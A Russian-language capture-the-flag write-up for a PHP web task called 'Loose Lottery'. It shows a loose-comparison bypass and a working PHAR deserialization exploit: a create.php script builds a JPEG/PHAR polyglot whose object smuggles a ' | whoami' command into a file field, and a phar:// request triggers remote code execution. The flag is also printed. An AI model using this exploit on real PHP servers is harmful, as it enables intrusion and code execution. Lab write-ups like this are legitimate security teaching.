# Loose Lottery

Я случайно перешёл по рекламе на этот сайт, но так и не смог выиграть. Может быть тебе повезёт больше.

## Hint:

1.Разработчик при создании сайта допустил много... неточностей.

# Difficulty
Medium

# Solve

1. Переходим на главную страницу, находим поле ввода и предложение угадать случайное число. Пробуем, не получается, ищем дальше. Находим подсказку в виде коммендария HTML. Это то число, которое нам необходимо было угадать, но увы оно слишком длинное для формы ввода...

   Далее стоит проявить внимание к деталям:
    - в ответе сервера видно, что приложение написано на PHP 5.6;
    - в названии фигурирует слово 'Loose';
    - найденное число примечательно тем, что при переводе его в 16-тиричную систему счисления получим 10 в 14-ой степени.

   Сопоставление всех деталей воедино должно привести нас к выводу, что тут может использоваться неточное сравнение при проверке введённого числа с целевым. В старых версиях PHP это позволяло получить положительный результат сравнения одного и того же числа, представленного в 10-ти и 16-тиричной системе.

   Переводим 72057594037927935 в 0xFFFFFFFFFFFFFF, пробуем пройти проверку, ура победа.

2. Второй этап таска начинается с предложения загрузить фото победителя лотереи. Для нас это означает наличие возможности загрузки файлов. Тестируем функционал и и получаем ограниечение по типу файла - "Only JPG files are allowed." Загрузив валидный файл, можем перейти на страничку просмотра информации о себе. Находим кнопку View Source Code, изучаем.

   Выделяем для себя главные моменты:
   - наличие магического метода "__destruct";
   - функция исполнения кода в деструкторе;
   - использование file_exists() к загруженному пользователем файлу.

   Кто знаком с данной уязвимостью сразу должен понять, что здесь возможна эксплуатация десериализации с использованием PHP архива(PHAR). Остальным же Google в помощь, главным маяком для вас должны быть выделенные ранее моменты, особенно 1 и 2.

   На данном этапе перед нами три задачи - обойти ограничение типа файлов; создать объект класса 'UserInfo' с необходимыми нам параметрами, поместить полезную нагрузку в PHAR. Последняя решается довольно просто. Уязвимость далеко не новая и инструкций по созданию подобного вредоносного архива навалом. Можно просто пойти на HackTricks:

   ```
   https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization
    ```

   Первая может быть решена путём использования файлов-полиглотов. В нашем случае применим Phar + JPG. Ну а в создании объекта класса нам поможет только изучение работы кода. У меня получился вот такой create.php:

   ```
   <?php

	class UserInfo
	{
	    public $name = 'foo';
	    public $info = 'bar';
	    public $photo = ' | whoami';
	    private $deletePhoto = true;
	}
	
	$phar = new Phar('shell.jpeg');
	$phar->startBuffering();
	$phar->addFromString('test.txt', 'text');
	$phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74 __HALT_COMPILER(); ?>");
	
	$object = new UserInfo();
	$phar->setMetadata($object);
	$phar->stopBuffering();
	
	?>
	```

   Для того, чтобы файл считался легитимным, но полезная нагрузка по прежнему отрабатывала, необходимо добавить заголовочные байты JPEG в заглушку и поместить созданный нами объект класса в метаданные архива.

   Подробнее об этом коде можно прочитать туть:
   ```
   https://www.nc-lp.com/blog/disguise-phar-packages-as-images
	```

   Теперь нам только остаётся загрузить файл и обратиться к нему при помощи схемы нужной схемы:
   ```
   ?winner=phar://user.jpg/test.txt
	```

   Таким образом мы добились удалённого исполнения кода, осталось только просмотреть содержимое директории и прочитать драгоценный флаг.

# Flag

mctf{M41n_53cR37_E70gO_k4Z1n0}